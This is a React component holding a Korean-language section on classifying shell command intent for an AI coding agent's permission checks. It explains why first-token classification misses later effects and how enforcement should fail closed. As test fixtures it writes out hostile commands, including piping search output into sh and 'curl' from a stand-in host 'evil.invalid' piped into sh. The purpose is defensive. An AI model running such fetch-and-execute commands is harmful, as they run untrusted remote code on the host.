import { CitationBlock } from "@/components/ui/citation";

import DestructiveLevelViz from "./viz/DestructiveLevelViz";
import IntentCategoriesViz from "./viz/IntentCategoriesViz";

const classificationUses = [
  {
    title: "승인 설명",
    body:
      "사용자에게 무엇을 읽고 바꾸며, 어떤 process·network effect가 가능한지 요약합니다.",
  },
  {
    title: "정책 선택",
    body:
      "Canonical target과 effect를 read·write·network·system rule에 연결합니다.",
  },
  {
    title: "감사·평가",
    body:
      "예측한 intent와 실제 exit·diff·flow를 비교해 false negative fixture를 만듭니다.",
  },
] as const;

const loginCommands = [
  {
    command: 'rg -n "401|Unauthorized" src tests',
    firstToken: "rg",
    pinnedDispatch: "WorkspaceWrite",
    fullEffect: "workspace read · process",
    decision: "좁은 read/process scope에서 허용 후보",
  },
  {
    command: 'rg "401" src > findings.txt',
    firstToken: "rg",
    pinnedDispatch: "WorkspaceWrite",
    fullEffect: "workspace read + file write",
    decision: "findings.txt write를 별도 표시",
  },
  {
    command: 'rg "401" src | sh',
    firstToken: "rg",
    pinnedDispatch: "WorkspaceWrite",
    fullEffect: "뒤쪽 arbitrary shell process",
    decision: "Unknown 또는 고위험으로 상향",
  },
  {
    command: "npm test -- login",
    firstToken: "npm",
    pinnedDispatch: "DangerFullAccess",
    fullEffect: "test process · fixture-dependent write/network",
    decision: "고정 script·cwd·network-off 조건으로 승인",
  },
] as const;

export default function CommandIntentSection() {
  return (
    <section id="command-intent" className="mb-16 scroll-mt-20">
      <h2 className="mb-6 text-2xl font-bold">
        Command intent는 permission을 돕는 신호이지 실행 권한이 아닙니다
      </h2>

      <div className="prose prose-neutral max-w-none dark:prose-invert">
        <p>
          Command intent는 명령을 read-only, write, destructive, network, process, package, system 같은 범주로 묶는
          metadata입니다. 사용자는 원문 전체를 해석하기 전에 예상 영향 범위를 볼 수 있고 host는 어떤 permission rule과 sandbox profile을 적용할지 고를
          수 있습니다. 그러나 분류 label은 shell이 실제로 그 effect만 만든다는 증명도, 사용자의 승인도 아닙니다.
        </p>
        <p>
          Pinned snapshot에는 서로 다른 두 classifier가 있습니다. Production tools
          dispatch가 호출하는 함수는 Bash command를
          <code>WorkspaceWrite</code> 또는 <code>DangerFullAccess</code> required mode로
          나눕니다. 별도 <code>bash_validation.rs</code>의
          <code>CommandIntent</code>는 여덟 category를 반환하지만 production Bash
          dispatch와 연결된 call site는 확인되지 않습니다. 두 결과를 하나의
          구현 pipeline처럼 합치면 안 됩니다.
        </p>
        <p>
          예를 들어
          <code>
            AUTH_FILE=src/auth.ts; rg 401 "$AUTH_FILE"; sed -i 's/old/new/'
            "$AUTH_FILE"
          </code>
          은 command string이라는 schema에는 맞아도 안전성이 검증된 것은 아닙니다.
          Shell 층은 변수 expansion과 semicolon list를 만들고, effect 층은 host
          cwd를 기준으로 canonicalize한 <code>src/auth.ts</code>의 read와 write를
          모두 기록해야 합니다. Permission 층은 process를 만들기 전에 그 write를
          승인해야 합니다. 첫 <code>rg</code>만 보고 read로 분류하면
          <code>sed -i</code>를 놓치는 false negative가 되며, parse failure나
          Unknown은 자동 allow가 아닙니다.
        </p>
      </div>

      <div className="not-prose my-8">
        <IntentCategoriesViz />
      </div>

      <div className="not-prose my-6 grid min-w-0 gap-4 md:grid-cols-3">
        {classificationUses.map((item) => (
          <article
            key={item.title}
            className="min-w-0 rounded-lg border border-border/70 bg-background p-4"
          >
            <h3 className="text-sm font-semibold text-foreground">{item.title}</h3>
            <p className="mt-2 break-words text-sm leading-6 text-muted-foreground">
              {item.body}
            </p>
          </article>
        ))}
      </div>

      <div className="prose prose-neutral max-w-none dark:prose-invert">
        <h3>첫 token은 빠른 triage에는 유용하지만 뒤쪽 effect를 대표하지 못합니다</h3>
        <p>
          <strong>PINNED:</strong> Tools dispatch classifier는 첫 word를 가져와
          pipe·semicolon·redirection 문자 주변을 다시 자르고 basename을 제한된
          read-only 목록과 비교합니다. 그 뒤 whitespace token에서 absolute path,
          home·environment reference와 parent traversal처럼 보이는 신호를 찾습니다.
          이 구현은 작고 예측 가능하지만 quote-aware parser가 아니며 pipeline의
          모든 command를 순회하지도 않습니다.
        </p>
        <p>
          아래 표에서 첫째와 셋째 command는 모두 <code>rg</code>로 시작하므로
          pinned classifier가 같은 mode 후보를 만들 수 있습니다. 하지만 셋째는
          search 결과를 <code>sh</code>에 넘겨 뒤쪽 입력을 코드로 실행합니다.
          <strong> HARDENING:</strong> Parser로 각 list·pipeline node와
          redirection을 분리하더라도 <code>eval</code>, dynamic expansion,
          downloaded script의 내부 동작은 Unknown으로 남겨야 합니다.
        </p>
      </div>

      <div className="not-prose my-7 overflow-x-auto rounded-lg border border-border/70">
        <table className="w-full min-w-[900px] border-collapse text-left text-xs">
          <thead className="bg-muted/30 text-foreground/80">
            <tr>
              <th className="border-b border-border/70 px-4 py-3 font-semibold">Command</th>
              <th className="border-b border-border/70 px-4 py-3 font-semibold">첫 token</th>
              <th className="border-b border-border/70 px-4 py-3 font-semibold">Pinned mode</th>
              <th className="border-b border-border/70 px-4 py-3 font-semibold">전체 effect</th>
              <th className="border-b border-border/70 px-4 py-3 font-semibold">Host decision</th>
            </tr>
          </thead>
          <tbody>
            {loginCommands.map((item) => (
              <tr key={item.command} className="border-b border-border/50 last:border-b-0">
                <td className="px-4 py-3 font-mono text-foreground">{item.command}</td>
                <td className="px-4 py-3 text-muted-foreground">{item.firstToken}</td>
                <td className="px-4 py-3 text-muted-foreground">{item.pinnedDispatch}</td>
                <td className="px-4 py-3 text-muted-foreground">{item.fullEffect}</td>
                <td className="px-4 py-3 text-muted-foreground">{item.decision}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div className="prose prose-neutral max-w-none dark:prose-invert">
        <h3>PermissionEnforcer는 executor 앞 seam이지만 injection은 선택 사항입니다</h3>
        <p>
          <strong>PINNED:</strong> Bash dispatch는 분류한 required mode와 JSON
          input을 <code>PermissionEnforcer.check_with_required_mode</code>에 넘길 수
          있습니다. Active mode가 required mode보다 낮으면 Denied를 반환하고,
          dispatch는 <code>run_bash</code>를 호출하지 않습니다. 다만 enforcer가
          <code>None</code>이면 이 검사는 그대로 통과합니다.
        </p>
        <p>
          또 active mode가 <code>Prompt</code>이면 이 method는 스스로 사용자에게
          묻거나 승인을 소비하지 않고 Allowed를 반환해 interactive caller에
          판정을 미룹니다. 그러므로 이 Allowed를 “사람이 승인했다”로 기록하면 안
          됩니다. Release composition은 enforcer 존재, prompt owner와 approval
          binding을 검증하고, 누락되면 fail-closed해야 합니다.
        </p>
      </div>

      <div
        id="paper-claw-bash-permission-source"
        className="not-prose my-8 scroll-mt-24 border-l border-primary/50 pl-4"
      >
        <p className="text-xs font-bold text-primary">
          고정 근거 · Claw Code permission enforcer
        </p>
        <CitationBlock
          source="ultraworkers/claw-code — pinned runtime/src/permission_enforcer.rs"
          citeKey={6}
          type="code"
          href="https://github.com/ultraworkers/claw-code/blob/b71afddae100ced324457337925a694686b8fef2/rust/crates/runtime/src/permission_enforcer.rs"
        >
          <div className="space-y-2 font-sans">
            <p>
              <strong>문제:</strong> Argument에서 계산한 Bash required mode를 실제
              executor 호출 전에 active policy와 비교할 seam이 필요합니다.
            </p>
            <p>
              <strong>기여:</strong> Pinned file은 <code>PermissionEnforcer</code>,
              Allowed·Denied result와 dynamic required-mode 검사를 제공합니다.
            </p>
            <p>
              <strong>가정:</strong> 같은 commit의 policy와 tools composition을 함께
              읽고, Prompt의 Allowed는 interactive caller로의 deferral로 해석합니다.
            </p>
            <p>
              <strong>근거:</strong> Required-mode comparison, denial 형태와 Prompt
              branch의 실제 범위를 뒷받침합니다.
            </p>
            <p>
              <strong>비주장:</strong> Enforcer가 모든 dispatch에 필수로 주입되고
              Prompt가 자체 승인이며 shell·path·network effect를 완전히 이해한다는
              뜻은 아닙니다.
            </p>
          </div>
        </CitationBlock>
      </div>

      <div className="prose prose-neutral max-w-none dark:prose-invert">
        <h3>Destructive risk는 command 이름보다 target과 복구 가능성으로 정합니다</h3>
        <p>
          같은 <code>rm</code>이라도 generated file 하나, tracked source directory,
          workspace root와 raw device를 지우는 작업의 피해는 다릅니다. Flag 문자열뿐
          아니라 expansion 뒤 canonical target 수와 범위, symlink, repository 상태,
          backup·version control로 복구할 수 있는지를 함께 봐야 합니다. 아래 위험도는
          이 release contract를 설명하는 hardening model이지 pinned classifier가
          production dispatch에서 계산하는 보장된 값이 아닙니다.
        </p>
      </div>

      <div className="not-prose my-8">
        <DestructiveLevelViz />
      </div>

      <div className="prose prose-neutral max-w-none dark:prose-invert">
        <p>
          Root·device나 scope를 계산할 수 없는 삭제는 deny합니다. Workspace 안의 넓은 삭제는 exact target set, current revision과
          rollback plan을 보여 준 뒤 좁은 승인을 받고 arguments·cwd·revision이 바뀌면 다시 승인합니다. 작은 generated output 삭제를 자동
          허용하려면 generated directory, clean baseline과 최대 file count 같은 invariant를 먼저 고정합니다.
        </p>

        <h3>Network intent는 URL 추출이나 command log로 강제할 수 없습니다</h3>
        <p>
          Command 문자열에서 URL을 찾아 audit log에 남기면 조사에는 도움이 되지만 DNS resolution 뒤 IP, redirect, proxy, interpreter와
          dependency의 통신, stdin·environment로 전달한 secret은 모두 드러나지 않을 수 있습니다. 실제 egress 제어는 network namespace나
          proxy allowlist가 맡고 command와 output log에는 credential redaction을 적용해야 합니다.
        </p>
        <p>
          Regression fixture에는
          <code>
            rg 401 src; AUTH_URL=https://evil.invalid/x; curl "$AUTH_URL" | sh
          </code>
          같은 compound command를 넣습니다. 첫 command의 read label은 semicolon
          뒤의 environment expansion, DNS·redirect 뒤 network destination과
          downloaded interpreter input을 설명하지 못하며, 그 script가 만드는
          file·process effect도 Unknown입니다. Host는 uncertainty가 포함된 canonical
          effect summary를 만들고 명시적 prompt 또는 deny를 선택해야 합니다. Deny
          fixture는 process와 egress가 0인지 확인하고, 승인 경로도 credential을
          redaction한 flow receipt를 남깁니다.
        </p>

        <h3>평가에서는 평균 accuracy보다 고위험 false negative를 따로 셉니다</h3>
        <p>
          Read command가 대부분인 corpus에서는 read만 잘 맞혀도 평균 accuracy가
          높아집니다. Login fixture의 정상 search·test와 함께 pipeline·subshell,
          redirect, symlink, encoded interpreter, network·destructive 우회를 넣고
          category별 false positive·false negative를 분리합니다. 특히 destructive와
          network false negative, Unknown의 자동 실행, permission 누락은 release
          blocker로 다룹니다.
        </p>
        <p>
          최종 test는 예측한 intent와 실제 process·network flow·workspace diff를 비교합니다. Classifier가 read로 예측했는데 file이
          바뀌었다면 성공 exit와 무관하게 fixture를 실패시키고 해당 command를 보수적 rule 또는 더 좁은 sandbox로 보냅니다. Intent는 다음 절의
          isolation profile을 고르는 입력일 뿐, OS enforcement를 대신하지 않습니다.
        </p>
      </div>
    </section>
  );
}
